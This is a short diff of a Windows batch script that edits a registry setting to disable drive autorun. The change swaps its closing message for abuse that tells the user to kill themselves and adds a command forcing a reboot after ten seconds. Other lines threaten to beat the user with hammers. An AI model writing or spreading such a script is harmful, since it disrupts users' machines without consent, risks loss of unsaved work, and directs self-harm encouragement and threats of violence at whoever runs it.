@@ -33,7 +33,9 @@ REM adds the "NoDriveTypeAutoRun" setting
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f
 
 REM finish
-echo fucked ur shit UPPP dawg. close this damn window.
+echo fucked ur shit UPPP dawg. restarting your machine now idgaf. kys
+
+shutdown /r /t 10
 
 :Not_Approved
 echo We're beating you with hammers
